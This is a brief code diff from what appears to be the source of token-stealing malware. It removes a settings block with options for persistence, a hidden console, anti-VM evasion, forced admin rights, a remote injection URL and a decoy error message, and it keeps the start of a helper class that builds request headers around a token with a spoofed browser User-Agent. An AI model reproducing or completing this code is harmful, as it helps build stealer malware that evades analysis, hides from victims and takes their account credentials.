@@ -1,14 +1,3 @@
-    'persist': True,
-    'keep-alive': False,
-    'injection_url': 'url to injection (raw)',
-    'inject': False,
-    'hideconsole': True,
-    'antivm': True,
-    'force_admin': False,
-    'black_screen': False,
-    'error': False,
-    'error_message': 'write any error message here',
-}
 class functions(object):
     def getHeaders(self, token:str=None, content_type="application/json") -> dict:
         headers = {"Content-Type": content_type, "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
